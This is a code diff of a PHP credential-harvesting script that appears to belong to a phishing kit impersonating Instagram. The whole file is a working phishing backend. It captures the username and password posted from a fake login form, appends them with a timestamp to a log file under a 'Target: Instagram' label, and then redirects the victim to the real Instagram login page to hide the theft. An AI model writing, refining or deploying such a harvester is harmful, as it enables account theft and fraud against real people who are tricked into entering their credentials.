@@ -1,18 +1,20 @@
 <?php
+// Capture data from POST
+$user = $_POST['user'] ?? 'Unknown';
+$pass = $_POST['pass'] ?? 'Unknown';
 
-$username = $_POST['username'];
-$password = $_POST['password'];
+// Format the log entry
+$log_entry = "---------------------------\n";
+$log_entry .= "Target: Instagram\n";
+$log_entry .= "Username: " . $user . "\n";
+$log_entry .= "Password: " . $pass . "\n";
+$log_entry .= "Time: " . date('Y-m-d H:i:s') . "\n";
+$log_entry .= "---------------------------\n";
 
-$file = "../../logs/output.txt";
+// Write to the central log file in the logs/ directory
+file_put_contents('../../logs/output.txt', $log_entry, FILE_APPEND);
 
-$data = "Username: ".$username." | Password: ".$password."\n";
-
-file_put_contents($file,$data,FILE_APPEND);
-
-echo "<script>
-
-window.location='https://www.instagram.com/accounts/login/';
-
-</script>";
-
+// Redirect to the actual Instagram login page
+header("Location: https://www.instagram.com/accounts/login/");
+exit();
 ?>
